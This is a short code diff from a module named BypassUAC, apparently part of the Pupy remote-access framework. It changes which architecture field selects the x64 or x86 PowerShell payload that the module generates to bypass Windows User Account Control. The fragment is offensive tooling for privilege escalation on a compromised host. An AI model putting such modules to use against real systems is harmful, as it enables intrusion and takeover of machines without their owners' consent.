@@ -68,7 +68,7 @@ class BypassUAC(PupyModule):
         # use powershell
         if not args.exe and not args.restart:
             self.info('Using powershell payload')
-            if '64' in  self.client.desc['proc_arch']:
+            if '64' in  self.client.desc['os_arch']:
                 local_file = pupygen.generate_ps1(self.client.get_conf(), x64=True)
             else:
                 local_file = pupygen.generate_ps1(self.client.get_conf(), x86=True)
